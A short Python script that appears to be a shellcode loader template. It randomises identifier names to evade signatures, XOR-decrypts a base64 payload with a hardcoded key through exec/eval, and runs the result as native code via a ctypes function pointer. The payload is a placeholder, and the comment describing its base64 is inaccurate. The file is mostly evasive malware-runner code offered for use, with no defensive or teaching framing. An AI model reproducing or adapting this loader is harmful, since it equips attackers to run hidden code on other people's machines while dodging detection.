#!/usr/bin/env python3
import base64
import ctypes
import random
import string

def random_id(prefix="f"):
    return prefix + ''.join(random.choices(string.ascii_letters, k=8))

decrypt_func_name = random_id("dec_")
key_var = random_id("key_")
data_var = random_id("data_")

payload_b64 = b"fwd0c2hlbGxjb2RlX2hlcmU="  # base64 for b'rawshellcode_here'

exec(f"""
def {decrypt_func_name}({data_var}, {key_var}):
    data = base64.b64decode({data_var})
    return bytes([b ^ {key_var}[i % len({key_var})] for i, b in enumerate(data)])
""")

def main():
    key = b"supersecret"  # Replace with real Speck/PolyRoot key
    shellcode = eval(f"{decrypt_func_name}(payload_b64, key)")
    buf = ctypes.create_string_buffer(shellcode, len(shellcode))
    func = ctypes.cast(buf, ctypes.CFUNCTYPE(None))
    func()

if __name__ == "__main__":
    main()
